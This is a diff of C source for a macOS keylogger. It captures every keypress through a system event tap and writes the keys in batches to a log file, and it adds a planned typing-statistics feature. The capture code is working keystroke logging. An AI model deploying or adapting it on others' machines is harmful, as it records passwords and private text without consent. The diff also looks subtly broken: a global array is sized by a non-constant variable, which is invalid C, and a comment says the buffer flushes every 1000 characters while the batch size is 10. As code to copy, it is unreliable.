@@ -1,17 +1,21 @@
-#include "keylogger.h"
+#include "batman.h"
 
 CGEventFlags lastFlags = 0;
 
 struct hashmap *hm = NULL;
+struct hashmap *stats = NULL;
 
-char buffer[1000];
+int BATCH_SZ = 10;
+char buffer[BATCH_SZ];
 
-int BATCH_SZ = 1000;
+// FLUSH EVERY 1000 CHARACTERS
 int buffer_index = 0;
 int hashmap_size = 0;
+int stats_size = 0;
 
 void flush() {
   fwrite(buffer, 1, buffer_index, logfile);
+
   buffer_index = 0;
   memset(buffer, 0, BATCH_SZ);
 }
@@ -21,16 +25,6 @@ int main(int argc, const char *argv[]) {
   signal(SIGTERM, flush);
 
   update_hashmap(&hm, &hashmap_size);
-  for (int i = 0; i < hashmap_size; i++) {
-    char **args = NULL;
-    int args_length;
-
-    get_value(
-      hm, hashmap_size,
-      hm[i].key,
-      NULL, args, &args_length
-    );
-  };
 
   CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
   CFMachPortRef eventTap = CGEventTapCreate(
@@ -78,7 +72,7 @@ int main(int argc, const char *argv[]) {
     exit(1);
   };
 
-  fprintf(logfile, "\n\nKeylogging has begun.\n");
+  fprintf(logfile, "Keylogging has begun.\n");
   fflush(logfile);
 
   printf("Logging to: %s\n", logfileLocation);
@@ -98,8 +92,6 @@ CGEventRef CGEventCallback(
   if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
     return event;
   };
-
-  update_hashmap(&hm, &hashmap_size);
 
   CGEventFlags flags = CGEventGetFlags(event);
   CGKeyCode keyCode =
@@ -148,7 +140,19 @@ CGEventRef CGEventCallback(
   buffer[buffer_index] = convertKeyCode(keyCode, shift, caps)[0];
   buffer_index++;
 
-  if (buffer_index == BATCH_SZ) flush();
+  /*
+    we need to also keep stats
+    - speed of typing
+    - number of times backspace was pressed
+    - most used keys
+    - most used key combinations
+    - ignore (shift, ctrl, cmd, option)
+  */
+
+  if (buffer_index == BATCH_SZ) {
+    flush();
+    update_hashmap(&hm, &hashmap_size);
+  };
   return event;
 }
 
